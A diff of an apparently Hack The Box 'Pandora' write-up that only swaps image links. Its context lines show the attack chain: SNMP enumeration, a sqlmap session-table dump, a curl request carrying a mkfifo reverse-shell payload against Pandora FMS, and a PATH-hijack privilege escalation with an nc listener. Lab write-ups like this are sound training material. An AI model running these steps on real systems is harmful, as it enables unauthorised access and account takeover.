@@ -92,15 +92,15 @@ Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
 ```
 snmpwalk -v 1 -c public $target
 ```
-![[Pasted image 20251113124057.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113124057.png)
 
 After a few minutes we get:
-![[Pasted image 20251113124750.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113124750.png)
 
 ```
 cat /etc/apache2/sites-enabled/pandora.conf
 ```
-![[Pasted image 20251113131219.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113131219.png)
 
 Tunneling Web to our localhost: 
 ```
@@ -108,7 +108,7 @@ ssh daniel@10.129.58.133 -L 80:127.0.0.1:80
 ```
 
 Version at the bottom:
-![[Pasted image 20251113132929.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113132929.png)
 
 Top Results for version:
 https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/
@@ -128,7 +128,7 @@ Dumping the tsessions_php table in order to obtain a usable session_id value in 
 ```
 sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -Ttsessions_php --dump
 ```
-![[Pasted image 20251113134631.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113134631.png)
 
 URL in browser: 
 ```
@@ -136,7 +136,7 @@ http://localhost/pandora_console/include/chart_generator.php?session_id=g4e01qdg
 ```
 
 Forward from burp: 
-![[Pasted image 20251113135342.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113135342.png)
 
 Vulnerable to:
 https://github.com/hadrian3689/pandorafms_7.44
@@ -151,7 +151,7 @@ PARAMS="page=include/ajax/events&perform_event_response=10000000&target=mkfifo%2
 
 curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "${URL}?${PARAMS}"
 ```
-![[Pasted image 20251113141029.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113141029.png)
 
 Privesc:
 ```
@@ -160,7 +160,7 @@ file /usr/bin/pandora_backup
 /usr/bin/pandora_backup --help
 ltrace /usr/bin/pandora_backup 2>&1
 ```
-![[Pasted image 20251113143249.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113143249.png)
 
 Breaking out from the restricted shell environment
 https://gtfobins.github.io/gtfobins/at/#shell
@@ -174,7 +174,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 # Execute again: 
 /usr/bin/pandora_backup
 ```
-![[Pasted image 20251113144057.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113144057.png)
 
 PATH variable hijacking tar:
 ```
@@ -189,5 +189,5 @@ nc -nvlp 4444
 # Remote 
 /usr/bin/pandora_backup
 ```
-![[Pasted image 20251113154458.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251113154458.png)
 
